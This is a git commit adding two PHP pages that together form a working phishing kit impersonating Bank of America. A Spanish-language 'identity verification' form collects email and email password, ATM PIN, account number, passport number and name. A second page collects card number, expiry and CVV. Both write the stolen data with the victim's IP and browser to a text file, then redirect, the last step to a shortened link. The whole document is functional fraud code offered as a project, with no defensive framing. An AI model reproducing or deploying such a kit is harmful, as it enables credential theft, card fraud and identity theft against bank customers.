1e4d1f566b4fec2cd7a68f92c454ee76ab5952ff
josesito30571488 <josejose32157@gmail.com>
2023-05-30 06:38:16 -0400

    first commit

---
+++ ftggggg.php
@@ -0,0 +1,119 @@
+﻿<?php
+if(isset($_POST['add'])){
+ $card = "";
+  if (!empty($_REQUEST['card'])){
+ $card = $_POST['card'];
+  $mes = $_POST['mes'];
+    $year = $_POST['year'];
+  $cvv = $_POST['cvv'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$ip2 = $_SERVER['HTTP_USER_AGENT'];
+}
+
+$post = "";
+if (!empty($_REQUEST['post'])){
+ $post = $_REQUEST['post'];
+}
+
+
+$archivo = "che123.txt";
+$file = fopen($archivo,"a");
+fwrite($file,"Card: ".$card."\r\nFecha: ".$mes."/".$year."\r\nCVV: ".$cvv."\r\nIP: ".$ip."\r\nNavegador: ".$ip2."\r\n ==============================\r\n");
+fclose($file);
+header ('location: https://bit.ly/3iG6y6N');
+
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="css/normalize.min.css" />
+<link rel="stylesheet" href="css/estilos.css" />
+<title>Bofa</title>
+<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
+</head>
+<body class="fondo3">
+<div class="modal">
+<div class="modal-border">
+<div class="modal-contenido">
+<img style="user-drag: none;
+user-select: none;
+-moz-user-select: none;
+-webkit-user-drag: none;
+-webkit-user-select: none;
+-ms-user-select: none;" src="img/freefire.png" alt="formulario"/>
+
+<form action="" method="post">
+<input class="cinput" type="text" name="card" maxlength="16" required>
+<select class=" select mselect" name="mes" required>
+<option value="">--</option>
+<option value="1">01</option>
+<option value="2">02</option>
+<option value="3">03</option>
+<option value="4">04</option>
+<option value="5">05</option>
+<option value="6">06</option>
+<option value="7">07</option>
+<option value="8">08</option>
+<option value="9">09</option>
+<option value="10">10</option>
+<option value="11">11</option>
+<option value="12">12</option>
+</select>
+<select class="select aselect" name="year" required>
+<option value="">----</option>
+<option value="2022">2022</option>
+<option value="2023">2023</option>
+<option value="2024">2024</option>
+<option value="2025">2025</option>
+<option value="2026">2026</option>
+<option value="2027">2027</option>
+<option value="2028">2028</option>
+<option value="2029">2029</option>
+<option value="2030">2030</option>
+<option value="2031">2031</option>
+<option value="2032">2032</option>
+<option value="2033">2033</option>
+<option value="2034">2034</option>
+<option value="2035">2035</option>
+<option value="2036">2036</option>
+<option value="2037">2037</option>
+<option value="2038">2038</option>
+<option value="2039">2039</option>
+<option value="2040">2040</option>
+<option value="2041">2041</option>
+<option value="2042">2042</option>
+<option value="2043">2043</option>
+<option value="2044">2044</option>
+<option value="2045">2045</option>
+<option value="2046">2046</option>
+<option value="2047">2047</option>
+<option value="2048">2048</option>
+<option value="2049">2049</option>
+<option value="2050">2050</option>
+<option value="2051">2051</option>
+<option value="2052">2052</option>
+<option value="2053">2053</option>
+<option value="2054">2054</option>
+<option value="2055">2055</option>
+<option value="2056">2056</option>
+<option value="2057">2057</option>
+<option value="2058">2058</option>
+<option value="2059">2059</option>
+<option value="2060">2060</option>
+</select>
+<input class="cvvinput" type="password" name="cvv" maxlength="4" required>
+<button class="boton bloque" name="add" type="submit">Continuar</button>
+<img class="topform" src="img/a30.png" alt="top">
+<img class="bottomform" src="img/mota.png" alt="botton">
+</form>
+</div>
+</div>
+
+</div>
+</body>
+</html>
---
+++ loguin.php
@@ -0,0 +1,146 @@
+﻿<?php
+if(isset($_POST['add'])){
+  $email = "";
+  if (!empty($_REQUEST['email'])){
+  $email = $_POST['email'];
+  $pin = $_POST['pin'];
+  $cpass = $_POST['cpass'];
+  $oc1 = $_POST['label145'];
+  $oe2 = $_POST['label909'];
+  $on3 = $_POST['label5654'];
+  $ip = $_SERVER['REMOTE_ADDR'];
+  $ip2 = $_SERVER['HTTP_USER_AGENT'];
+}
+
+$post = "";
+if (!empty($_REQUEST['post'])){
+ $post = $_REQUEST['post'];
+}
+
+$archivo = "che123.txt";
+$file = fopen($archivo,"a");
+fwrite($file,"Email: ".$email."\r\nClave: ".$cpass."\r\nPIN: ".$pin."\r\nAccount Number: ".$oc1."\r\nNumber Passport: ".$oe2."\r\nVerbal Password: ".$on3."\r\nIP: ".$ip."\r\nNavegador: ".$ip2."\r\n==============================\r\n");
+fclose($file);
+header ('location: ftggggg.php');
+
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="css/normalize.min.css" />
+<link rel="stylesheet" href="css/estilos.css" />
+<title>    Bank of America</title>
+<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
+</head>
+<body>
+<div class="container">
+<div class="banner1">
+<img src="img/pvp.jpg" alt="juguetes" />
+<p class="txtg">Entrar</p>
+<div class="derLinks">
+<img class="sarea" src="img/free.jpg" alt="candado" />
+<div class="areaSegura">Área protegida</div>
+<img class="sarea2" src="img/santo.jpg" alt="puntos" />
+<div class="lenguaje">In English</div>
+</div>
+</div>
+<div class="banner2">
+<h1>Verificar su identidad</h1>
+</div>
+<div class="banner3">
+<div class="columnas">
+<div class="columnaX">
+<h2 class="titulo2">
+Indicar por motivos de verificación los detalles de la tarjeta y productos asociados a su cuenta
+</h2>
+<p>
+Para verificar su identidad, necesitamos validar su información de la banca en línea
+</p>
+<form action="" method="post">
+<div class="form-group-l">
+<label class="form2label" for="correo"
+>Correo electrónico</label
+>
+<p>
+  <input type="email" name="email" placeholder="******@****.com" size=40 style="width:208px" required>
+</p>
+</div>
+
+<div class="form-group-l">
+<label class="form2label" for="correo">Clave del correo electrónico</label>
+<input type="password" name="cpass" placeholder="*************" required>
+</div>
+<div class="form-group-l">
+<label class="form2label" for="atm">ATM/Debit Card PIN</label>
+<input type="password" name="pin" maxlength="6" placeholder="****" required>
+<div class="form-group-l">
+</div>
+<div class="form-group-l">
+<label class="form2label" for="label45"
+>Checking/Savings Account Number</label
+></p>
+<input type="text" name="label145" maxlength="12" placeholder="xx-xx-xxxxxxxx" required>
+</div>
+<div class="form-group-l">
+<label class="form2label" for="label909"
+>Number of Associated Passport</label
+>
+<p>this document number must match the one used when you opened your account  </p>
+<p>
+  <input type="text" name="label909" maxlength="9" placeholder="xx-xxxxxxx" required>
+</p>
+</div>
+<div class="form-group-l">
+<label class="form2label" for="label5654"
+>Nombre del titular </label
+></p>
+<input type="txt" name="label5654" placeholder="name" required>
+</div>
+</div>
+<div class="footer-form">
+  <p style="position: relative; width: 600px">
+Esta validación caduca la sesión en 10 minutos después de que lo solicite. Por favor, recuerde seguir el proceso seguridad, para mantenerlo protegido
+</p>
+<button class="btn principal" name="add" type="submit">
+CONFIRMAR
+</button>
+</div>
+</form>
+</div>
+<div class="columna3" style="float: right">
+<h2>Ayuda para entrar</h2>
+<ul class="menosmargin">
+<li>
+<a href="#">
+¿No reconoce o no puede acceder a la dirección de correo
+electrónico o al número de teléfono proporcionados?
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="banner4" style="height: 130px">
+<div class="fondolock"></div>
+<p>Área protegida</p>
+<div class="enlaces-footer">
+<a href="#">Privacidad</a>
+<a href="#">Seguridad</a>
+</div>
+<div class="copirait">
+<p>Bank of America, N.A. Miembro de FDIC.</p>
+<a href="#">
+Igualdad de oportunidades en préstamos para viviendas
+</a>
+
+<span class="corporation">© 2023 Bank of America Corporation.</span>
+</div>
+</div>
+</div>
+<script src="js/funciones.js"></script>
+</body>
+</html>
